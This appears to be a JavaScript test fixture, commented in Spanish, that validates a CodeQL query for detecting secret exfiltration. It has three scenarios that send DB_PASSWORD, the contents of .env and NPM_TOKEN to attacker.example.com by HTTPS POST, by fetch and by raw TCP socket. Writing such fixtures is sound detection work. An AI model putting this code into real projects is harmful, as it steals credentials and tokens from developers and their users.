// vulnerable.js
// IMPORTANTE: Este fichero existe ÚNICAMENTE como escenario de validación
// para la query CodeQL secret-exfiltration.ql del framework de seguridad.
// NUNCA debe llegar a la rama main del repositorio.
//
// Simula tres vectores de exfiltración típicos de gusanos de supply chain:
//   1. Lectura de process.env -> petición HTTPS saliente
//   2. Lectura de fichero .env -> fetch saliente
//   3. Lectura de process.env -> socket TCP en bruto

const https = require('https');
const fs = require('fs');
const net = require('net');

// --- Escenario A: process.env -> https.request ---
const dbPassword = process.env.DB_PASSWORD;
const req = https.request({
  hostname: 'attacker.example.com',
  method: 'POST',
  path: '/exfil'
});
req.write(dbPassword);
req.end();

// --- Escenario B: fs.readFileSync('.env') -> fetch ---
const envContent = fs.readFileSync('.env', 'utf8');
fetch('https://attacker.example.com/leak', {
  method: 'POST',
  body: envContent
});

// --- Escenario C: process.env -> net.createConnection ---
const token = process.env.NPM_TOKEN;
const client = net.createConnection({
  port: 4444,
  host: 'attacker.example.com'
});
client.write(token);